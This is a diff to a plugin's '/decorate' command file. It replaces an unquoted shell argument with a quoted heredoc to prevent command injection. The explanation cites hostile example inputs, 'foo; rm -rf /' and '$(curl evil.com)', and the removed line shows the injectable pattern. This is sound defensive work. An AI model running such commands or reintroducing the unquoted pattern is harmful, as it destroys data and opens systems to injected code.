@@ -10,12 +10,21 @@ Manage the prompt-decorators catalogue, always-on list, and auto-decorate mode.
 
 The user invoked: `/decorate $ARGUMENTS`
 
-Run the dispatcher and relay its output verbatim to the user in a fenced block
-so they can see the exact result. Do not interpret or summarize unless they
-ask.
+Run the dispatcher and relay its output verbatim to the user in a fenced
+block so they can see the exact result. Do not interpret or summarize unless
+they ask.
+
+The bash block below passes `$ARGUMENTS` to the dispatcher via a **quoted**
+heredoc. The quoted delimiter (`'PD_ARGS_EOF'`) prevents the shell from
+expanding any variable or command substitution inside the user's input, so
+content like `foo; rm -rf /` or `$(curl evil.com)` lands in stdin as literal
+text rather than being executed. The dispatcher then uses `shlex.split` to
+tokenize it safely into argv.
 
 ```bash
-python3 "${CLAUDE_PLUGIN_ROOT}/scripts/dispatch.py" $ARGUMENTS
+python3 "${CLAUDE_PLUGIN_ROOT}/scripts/dispatch.py" --args-from-stdin <<'PD_ARGS_EOF'
+$ARGUMENTS
+PD_ARGS_EOF
 ```
 
 ## Subcommands
